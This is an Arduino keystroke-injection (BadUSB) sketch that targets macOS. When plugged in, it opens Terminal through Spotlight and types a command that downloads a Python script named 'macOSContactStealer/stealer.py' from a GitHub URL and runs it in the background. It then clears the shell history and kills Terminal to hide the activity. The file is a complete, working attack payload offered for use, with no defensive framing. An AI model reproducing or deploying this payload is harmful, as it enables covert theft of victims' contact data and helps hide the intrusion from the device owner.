#include "Keyboard.h"
int defaultDelay = 4;

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms

  delay(2600);

    delay(defaultDelay);
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press(' ');
    Keyboard.releaseAll();

    delay(defaultDelay);
    delay(500);

    delay(defaultDelay);
    Keyboard.print("terminal");

    delay(defaultDelay);
    delay(200);

    delay(defaultDelay);
    typeKey(KEY_RETURN);

    delay(defaultDelay);
    delay(1600);

    delay(defaultDelay);
    Keyboard.print("curl -L https://raw.githubusercontent.com/danthegoodman1/Custom-BashBunny-Payloads/master/macOSContactStealer/stealer.py | nohup python > /dev/null & history -cw && killall Terminal");

    delay(defaultDelay);
    delay(100);

    delay(defaultDelay);
    typeKey(KEY_RETURN);
    
    /* ----- End-Script -----*/
    
    Keyboard.end();
}

/* Unused endless loop */
void loop() {}
